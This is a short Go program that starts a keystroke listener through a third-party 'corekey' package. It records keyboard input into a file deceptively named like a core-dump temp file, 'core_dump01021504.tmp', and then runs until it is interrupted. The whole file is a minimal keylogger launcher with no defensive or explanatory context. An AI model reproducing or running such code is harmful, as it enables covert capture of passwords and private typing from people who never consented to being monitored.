package main

import (
	"os"
	"os/signal"
	"syscall"

	"github.com/dxasu/corekey"
)

func main() {
	corekey.KeyboardListen("core_dump01021504.tmp")

	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	<-sigs
}
